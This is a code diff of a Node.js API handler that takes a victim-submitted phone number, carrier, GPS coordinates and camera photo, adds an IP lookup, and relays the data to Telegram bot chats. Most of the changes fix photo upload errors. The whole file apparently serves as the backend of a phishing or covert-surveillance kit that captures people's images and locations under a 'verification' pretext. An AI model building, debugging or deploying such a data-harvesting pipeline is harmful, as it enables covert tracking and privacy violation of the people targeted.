@@ -44,9 +44,8 @@ module.exports = async (req, res) => {
         mobile: userData.mobile,
         operator: userData.operator,
         hasPhoto: !!userData.photo,
-        hasLocation: !!userData.location,
-        locationType: typeof userData.location,
-        locationData: userData.location
+        photoLength: userData.photo ? userData.photo.length : 0,
+        hasLocation: !!userData.location
       });
     } catch (e) {
       console.error('JSON error:', e);
@@ -63,90 +62,120 @@ module.exports = async (req, res) => {
     
     let ipInfoData = { ip: clientIp };
     
-    // ✅ FIXED LOCATION HANDLING
-    let locationText = 'Permission Denied';
-    let hasValidLocation = false;
-    
-    if (userData.location) {
-      console.log('📍 Raw location data:', userData.location);
-      
-      // Check different location formats
-      if (typeof userData.location === 'object') {
-        // Format 1: { latitude, longitude, accuracy }
-        if (userData.location.latitude && userData.location.longitude) {
-          hasValidLocation = true;
-          locationText = `Latitude: ${userData.location.latitude}\nLongitude: ${userData.location.longitude}\nAccuracy: ${userData.location.accuracy || 'N/A'}m\n🌍 Map: https://maps.google.com/?q=${userData.location.latitude},${userData.location.longitude}`;
-        }
-        // Format 2: { status: 'Permission Denied' }
-        else if (userData.location.status === 'Permission Denied') {
-          locationText = 'Permission Denied';
-        }
-      } 
-      // Format 3: String or other
-      else {
-        locationText = String(userData.location);
+    // Get IP details if token exists
+    if (IPINFO_TOKEN && clientIp !== 'Unknown') {
+      try {
+        const ipResponse = await axios.get(`https://ipinfo.io/${clientIp}/json?token=${IPINFO_TOKEN}`, {
+          timeout: 5000
+        });
+        ipInfoData = { ...ipInfoData, ...ipResponse.data };
+      } catch (ipError) {
+        console.log('⚠️ IP info failed:', ipError.message);
       }
     }
     
-    console.log('📍 Processed location:', { hasValidLocation, locationText });
+    // ✅ FIXED: LOCATION HANDLING
+    let locationText = 'Permission Denied';
+    let hasValidLocation = false;
+    let locationCoords = null;
     
-    // ✅ FIXED PHOTO HANDLING
+    if (userData.location) {
+      console.log('📍 Raw location:', JSON.stringify(userData.location).substring(0, 100));
+      
+      if (typeof userData.location === 'object') {
+        if (userData.location.latitude && userData.location.longitude) {
+          hasValidLocation = true;
+          locationCoords = userData.location;
+          locationText = `Latitude: ${userData.location.latitude}\nLongitude: ${userData.location.longitude}\nAccuracy: ${userData.location.accuracy || 'N/A'}m\n🌍 Map: https://maps.google.com/?q=${userData.location.latitude},${userData.location.longitude}`;
+        }
+        else if (userData.location.status) {
+          locationText = userData.location.status;
+        }
+      } 
+      else if (typeof userData.location === 'string') {
+        locationText = userData.location;
+      }
+    }
+    
+    console.log('📍 Processed:', { hasValidLocation, locationText: locationText.substring(0, 50) });
+    
+    // ✅ FIXED: PHOTO HANDLING (MAIN FIX)
     let photoStatus = 'Not Captured';
     let photoBuffer = null;
     let canSendPhoto = false;
+    let photoFormat = 'unknown';
     
-    if (userData.photo) {
-      console.log('📸 Processing photo data, type:', typeof userData.photo);
+    if (userData.photo && typeof userData.photo === 'string') {
+      console.log('📸 Photo string length:', userData.photo.length);
       
-      if (typeof userData.photo === 'string' && userData.photo.startsWith('data:image')) {
+      // Check for base64 data URL
+      if (userData.photo.startsWith('data:image')) {
         try {
-          // Extract and validate base64
-          const base64Match = userData.photo.match(/^data:image\/\w+;base64,(.+)$/);
-          if (base64Match && base64Match[1]) {
-            const base64Data = base64Match[1];
-            
-            // Validate base64
-            if (!base64Data.match(/^[A-Za-z0-9+/]+=*$/)) {
+          // Extract base64 part
+          const base64Data = userData.photo.split(',')[1];
+          
+          if (!base64Data) {
+            photoStatus = 'No Base64 Data';
+            console.error('❌ No base64 data after comma');
+          } 
+          else if (base64Data.length < 100) {
+            photoStatus = 'Base64 Too Short';
+            console.error('❌ Base64 too short:', base64Data.length);
+          }
+          else {
+            // Validate base64 format
+            if (!/^[A-Za-z0-9+/]+=*$/.test(base64Data)) {
+              photoStatus = 'Invalid Base64 Chars';
               console.error('❌ Invalid base64 characters');
-              photoStatus = 'Invalid Base64';
             } else {
-              // Create buffer with validation
-              const buffer = Buffer.from(base64Data, 'base64');
+              // Decode base64
+              photoBuffer = Buffer.from(base64Data, 'base64');
               
-              // Check if buffer is valid
-              if (buffer && buffer.length > 100) { // At least 100 bytes
-                photoBuffer = buffer;
-                const sizeKB = Math.round(buffer.length / 1024);
+              if (photoBuffer.length === 0) {
+                photoStatus = 'Empty Buffer';
+                console.error('❌ Buffer is empty');
+              } 
+              else {
+                const sizeKB = Math.round(photoBuffer.length / 1024);
                 
+                // Check MIME type
+                if (userData.photo.includes('image/jpeg') || userData.photo.includes('image/jpg')) {
+                  photoFormat = 'jpeg';
+                } else if (userData.photo.includes('image/png')) {
+                  photoFormat = 'png';
+                }
+                
+                // Size validation
                 if (sizeKB < 10) {
                   photoStatus = `Captured (${sizeKB}KB - Too Small)`;
+                  console.log(`⚠️ Image too small: ${sizeKB}KB`);
                 } else if (sizeKB > 10000) {
                   photoStatus = `Captured (${sizeKB}KB - Too Large)`;
+                  console.log(`⚠️ Image too large: ${sizeKB}KB`);
                 } else {
                   canSendPhoto = true;
                   photoStatus = `Captured ✓ (${sizeKB}KB)`;
-                  console.log(`✅ Photo buffer ready: ${sizeKB}KB`);
+                  console.log(`✅ Photo ready: ${sizeKB}KB, format: ${photoFormat}`);
                 }
-              } else {
-                photoStatus = 'Empty Buffer';
-                console.error('❌ Buffer empty or too small');
               }
             }
-          } else {
-            photoStatus = 'Invalid Data URL';
-            console.error('❌ Not a valid data URL');
           }
-        } catch (bufferError) {
-          console.error('❌ Buffer creation failed:', bufferError.message);
-          photoStatus = 'Buffer Error: ' + bufferError.message;
+        } catch (photoError) {
+          photoStatus = `Error: ${photoError.message}`;
+          console.error('❌ Photo processing error:', photoError);
         }
-      } 
-      else if (typeof userData.photo === 'object' && userData.photo.status === 'Permission Denied') {
+      }
+      else if (userData.photo === 'Permission Denied') {
         photoStatus = 'Permission Denied';
       }
       else {
-        photoStatus = 'Unknown Format: ' + typeof userData.photo;
+        photoStatus = 'Unknown Format';
+        console.log('📸 Not a data URL:', userData.photo.substring(0, 50));
       }
+    }
+    else if (userData.photo) {
+      photoStatus = `Type: ${typeof userData.photo}`;
+      console.log('📸 Non-string photo:', typeof userData.photo);
     }
     
     // Build Telegram message
@@ -190,85 +219,122 @@ ${locationText}
             text: message,
             parse_mode: 'Markdown'
           },
-          { timeout: 10000 }
+          { 
+            timeout: 10000,
+            // Force HTTP/1.1 to avoid PROTOCOL_ERROR
+            httpAgent: new (require('http').Agent)({ keepAlive: false }),
+            httpsAgent: new (require('https').Agent)({ keepAlive: false })
+          }
         );
         
         console.log(`✅ Message sent to ${chatId}`);
         
-        // 2. Send photo if available (FIXED METHOD)
-        if (canSendPhoto && photoBuffer) {
+        // 2. ✅ FIXED: Send photo using FormData (NO PROTOCOL_ERROR)
+        if (canSendPhoto && photoBuffer && photoBuffer.length > 0) {
           try {
-            console.log(`🖼️ Sending photo to ${chatId}...`);
+            console.log(`🖼️ Sending photo (${photoBuffer.length} bytes) to ${chatId}...`);
             
-            // SIMPLIFIED: Direct upload without FormData issues
-            // Convert buffer to base64 for Telegram
-            const base64Image = `data:image/jpeg;base64,${photoBuffer.toString('base64')}`;
+            // Use FormData - Telegram prefers this
+            const formData = new FormData();
             
-            await axios.post(
+            // Add photo as buffer
+            formData.append('photo', photoBuffer, {
+              filename: `capture_${userData.mobile}_${Date.now()}.${photoFormat === 'png' ? 'png' : 'jpg'}`,
+              contentType: photoFormat === 'png' ? 'image/png' : 'image/jpeg'
+            });
+            
+            // Add other fields
+            formData.append('chat_id', chatId);
+            formData.append('caption', `📸 Camera Captured\nMobile: ${userData.mobile}`);
+            
+            // Send with proper headers
+            const response = await axios.post(
               `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+              formData,
               {
-                chat_id: chatId,
-                photo: base64Image, // Direct base64 string
-                caption: `📸 Verification for ${userData.mobile}`
-              },
-              {
-                timeout: 15000,
                 headers: {
-                  'Content-Type': 'application/json'
-                }
+                  ...formData.getHeaders(),
+                  'Connection': 'close'  // Prevent HTTP/2 issues
+                },
+                timeout: 30000,
+                // Force HTTP/1.1
+                httpAgent: new (require('http').Agent)({ keepAlive: false }),
+                httpsAgent: new (require('https').Agent)({ keepAlive: false }),
+                maxContentLength: Infinity,
+                maxBodyLength: Infinity
               }
             );
             
             console.log(`✅ Photo sent successfully to ${chatId}`);
             
           } catch (photoError) {
-            console.error(`❌ Photo error to ${chatId}:`, {
+            console.error(`❌ Photo upload failed:`, {
               message: photoError.message,
+              code: photoError.code,
               response: photoError.response?.data
             });
             
-            // Alternative: Send as document
+            // Fallback: Try as document
             try {
-              const base64Image = `data:image/jpeg;base64,${photoBuffer.toString('base64')}`;
+              console.log(`📎 Trying fallback as document...`);
+              
+              const formData = new FormData();
+              formData.append('document', photoBuffer, {
+                filename: `photo_${userData.mobile}.${photoFormat === 'png' ? 'png' : 'jpg'}`,
+                contentType: photoFormat === 'png' ? 'image/png' : 'image/jpeg'
+              });
+              formData.append('chat_id', chatId);
+              formData.append('caption', `📸 Photo for ${userData.mobile}`);
+              
               await axios.post(
                 `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
+                formData,
                 {
-                  chat_id: chatId,
-                  document: base64Image,
-                  caption: `📸 Photo for ${userData.mobile}`
-                },
-                { timeout: 15000 }
+                  headers: formData.getHeaders(),
+                  timeout: 20000,
+                  httpAgent: new (require('http').Agent)({ keepAlive: false })
+                }
               );
-              console.log(`✅ Photo sent as document to ${chatId}`);
+              
+              console.log(`✅ Photo sent as document`);
             } catch (docError) {
-              console.error(`❌ Document also failed:`, docError.message);
+              console.error(`❌ Document upload failed:`, docError.message);
             }
           }
+        }
+        else if (canSendPhoto) {
+          console.log(`⚠️ Photo marked as sendable but buffer is empty`);
         }
         
         results.push({ chatId, success: true });
         
-        await new Promise(resolve => setTimeout(resolve, 500));
+        // Small delay between messages
+        await new Promise(resolve => setTimeout(resolve, 300));
         
       } catch (error) {
-        console.error(`❌ Error to ${chatId}:`, error.message);
+        console.error(`❌ Error sending to ${chatId}:`, error.message);
         results.push({ chatId, success: false, error: error.message });
       }
     }
     
+    // Success response
     res.status(200).json({ 
       success: true, 
       message: 'Data processed successfully',
-      location: hasValidLocation ? 'Received' : 'Missing/Denied',
-      photo: photoStatus,
+      details: {
+        location: hasValidLocation ? 'Valid' : 'Missing/Denied',
+        photo: photoStatus,
+        photoSent: canSendPhoto,
+        chats: results.length
+      },
       timestamp: new Date().toISOString()
     });
     
   } catch (error) {
-    console.error('❌ API Error:', error);
+    console.error('❌ Server Error:', error);
     res.status(500).json({ 
       success: false, 
-      error: error.message,
+      error: 'Internal server error: ' + error.message,
       timestamp: new Date().toISOString()
     });
   }
